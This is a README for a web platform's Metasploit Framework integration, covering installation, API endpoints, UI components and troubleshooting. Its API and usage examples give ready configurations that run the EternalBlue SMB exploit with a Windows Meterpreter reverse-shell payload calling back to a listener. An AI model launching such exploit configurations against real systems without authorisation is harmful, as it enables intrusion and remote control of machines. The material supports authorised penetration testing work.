# Metasploit Framework Integration

This document describes the integration of Metasploit Framework into the Cybersecurity Platform.

## Overview

Metasploit Framework is a powerful penetration testing platform that provides a comprehensive suite of tools for security testing, exploit development, and post-exploitation activities. This integration provides a web-based interface to interact with Metasploit Framework through the cybersecurity platform.

## Features

- **Exploit Management**: Browse and select from available exploits
- **Payload Configuration**: Choose appropriate payloads for different scenarios
- **Session Management**: Monitor and control active exploit sessions
- **Real-time Output**: View live exploit execution output
- **Session History**: Track completed and failed sessions
- **Exploit Information**: Detailed information about exploits and their options

## Installation

### Prerequisites

- Linux system (Ubuntu, Debian, CentOS, RHEL, Fedora)
- Git
- Ruby 3.0.6 or later
- PostgreSQL
- Java 11 or later

### Automated Installation

Run the installation script:

```bash
cd backend
./install_metasploit.sh
```

This script will:
1. Install all required dependencies
2. Install Ruby 3.0.6 using rbenv
3. Install and configure PostgreSQL
4. Install Metasploit Framework
5. Configure the database
6. Test the installation

### Manual Installation

If you prefer manual installation, follow these steps:

1. **Install Dependencies**:
   ```bash
   # Ubuntu/Debian
   sudo apt update
   sudo apt install -y curl wget git build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev openjdk-11-jdk libxml2-dev libxslt1-dev libgmp-dev zlib1g-dev
   
   # CentOS/RHEL/Fedora
   sudo yum update -y
   sudo yum groupinstall -y "Development Tools"
   sudo yum install -y curl wget git readline-devel openssl-devel postgresql-devel sqlite-devel libpcap-devel java-11-openjdk-devel libxml2-devel libxslt-devel gmp-devel zlib-devel
   ```

2. **Install Ruby**:
   ```bash
   curl -fsSL https://github.com/rbenv/rbenv-installer/raw/master/bin/rbenv-installer | bash
   echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
   echo 'eval "$(rbenv init -)"' >> ~/.bashrc
   source ~/.bashrc
   rbenv install 3.0.6
   rbenv global 3.0.6
   gem install bundler
   ```

3. **Install PostgreSQL**:
   ```bash
   # Ubuntu/Debian
   sudo apt install -y postgresql postgresql-contrib
   sudo systemctl start postgresql
   sudo systemctl enable postgresql
   sudo -u postgres createuser -s msf
   sudo -u postgres createdb msf
   
   # CentOS/RHEL/Fedora
   sudo yum install -y postgresql postgresql-server postgresql-contrib
   sudo postgresql-setup initdb
   sudo systemctl start postgresql
   sudo systemctl enable postgresql
   sudo -u postgres createuser -s msf
   sudo -u postgres createdb msf
   ```

4. **Install Metasploit Framework**:
   ```bash
   cd /opt
   sudo git clone https://github.com/rapid7/metasploit-framework.git
   sudo chown -R $USER:$USER /opt/metasploit-framework
   cd metasploit-framework
   bundle install
   
   # Create symlinks
   sudo ln -sf /opt/metasploit-framework/msfconsole /usr/local/bin/msfconsole
   sudo ln -sf /opt/metasploit-framework/msfvenom /usr/local/bin/msfvenom
   sudo ln -sf /opt/metasploit-framework/msfdb /usr/local/bin/msfdb
   sudo ln -sf /opt/metasploit-framework/msfrpcd /usr/local/bin/msfrpcd
   sudo ln -sf /opt/metasploit-framework/msfupdate /usr/local/bin/msfupdate
   
   # Initialize database
   msfdb init
   ```

## Backend Integration

### Files

- `backend/metasploit_tool.py`: Main Metasploit integration class
- `backend/app.py`: API endpoints for Metasploit functionality
- `backend/install_metasploit.sh`: Installation script

### API Endpoints

#### Check Installation Status
```
GET /api/tools/metasploit/status
```
Returns the installation status and version information.

#### Get Available Exploits
```
GET /api/tools/metasploit/exploits
```
Returns a list of available exploits with their details.

#### Get Available Payloads
```
GET /api/tools/metasploit/payloads
```
Returns a list of available payloads.

#### Get Exploit Information
```
GET /api/tools/metasploit/exploit/{exploit_name}/info
```
Returns detailed information about a specific exploit.

#### Start Exploit Session
```
POST /api/tools/metasploit/exploit/start
```
Body:
```json
{
  "target": "192.168.1.100",
  "exploit": "exploit/windows/smb/ms17_010_eternalblue",
  "payload": "windows/meterpreter/reverse_tcp",
  "options": {
    "LHOST": "192.168.1.10",
    "LPORT": "4444"
  }
}
```

#### Get Session Status
```
GET /api/tools/metasploit/session/{session_id}/status
```
Returns the current status and output of an exploit session.

#### Stop Session
```
POST /api/tools/metasploit/session/{session_id}/stop
```
Stops an active exploit session.

#### Get All Sessions
```
GET /api/tools/metasploit/sessions
```
Returns all active and completed sessions.

## Frontend Integration

### Files

- `frontend/src/components/Tools/MetasploitTool.tsx`: Main Metasploit UI component
- `frontend/src/App.tsx`: Route configuration
- `frontend/src/components/Layout/AppLayout.tsx`: Navigation menu

### Features

1. **Exploit Configuration Panel**:
   - Target input field
   - Exploit selection dropdown
   - Payload selection dropdown
   - Custom options configuration

2. **Session Management**:
   - Real-time session monitoring
   - Live output display
   - Session control (start/stop)
   - Session history

3. **Exploit Information**:
   - Detailed exploit information dialog
   - Available options display
   - Compatible payloads list

4. **Authentication**:
   - JWT-based authentication
   - Role-based access control
   - Secure API communication

## Usage

### Starting the Backend

1. Ensure Metasploit Framework is installed
2. Start the backend server:
   ```bash
   cd backend
   python3 app.py
   ```

### Accessing the Tool

1. Log in to the cybersecurity platform
2. Navigate to "Tools" → "Metasploit Framework"
3. Configure your exploit:
   - Enter target IP/hostname
   - Select an exploit module
   - Choose a payload
   - Configure any required options
4. Click "Start Exploit" to begin
5. Monitor the session in real-time
6. View output and results

### Example Usage

1. **Basic Exploit**:
   - Target: `192.168.1.100`
   - Exploit: `exploit/multi/handler`
   - Payload: `windows/meterpreter/reverse_tcp`
   - Options: `LHOST=192.168.1.10, LPORT=4444`

2. **EternalBlue Exploit**:
   - Target: `192.168.1.100`
   - Exploit: `exploit/windows/smb/ms17_010_eternalblue`
   - Payload: `windows/meterpreter/reverse_tcp`
   - Options: `LHOST=192.168.1.10, LPORT=4444`

## Security Considerations

1. **Authorization**: Only admin and analyst roles can access Metasploit tools
2. **Target Validation**: All targets are validated before execution
3. **Session Isolation**: Each exploit session is isolated
4. **Logging**: All activities are logged for audit purposes
5. **Resource Limits**: Sessions have timeout limits to prevent resource exhaustion

## Troubleshooting

### Common Issues

1. **Metasploit not found**:
   - Ensure installation completed successfully
   - Check PATH environment variable
   - Verify symlinks are created correctly

2. **Database connection issues**:
   - Ensure PostgreSQL is running
   - Check database configuration
   - Run `msfdb init` to initialize database

3. **Permission denied**:
   - Ensure proper file permissions
   - Check user permissions for Metasploit directory
   - Verify PostgreSQL user permissions

4. **Ruby version issues**:
   - Ensure Ruby 3.0.6 is installed
   - Check rbenv configuration
   - Verify bundler installation

### Debugging

1. **Check installation**:
   ```bash
   msfconsole --version
   msfvenom --help
   ```

2. **Test database connection**:
   ```bash
   msfdb status
   ```

3. **Check logs**:
   ```bash
   tail -f /var/log/postgresql/postgresql-*.log
   ```

## Updates

To update Metasploit Framework:

```bash
msfupdate
```

Or manually:

```bash
cd /opt/metasploit-framework
git pull
bundle install
```

## Contributing

To add new features or fix issues:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## License

This integration is part of the Cybersecurity Platform and follows the same licensing terms. 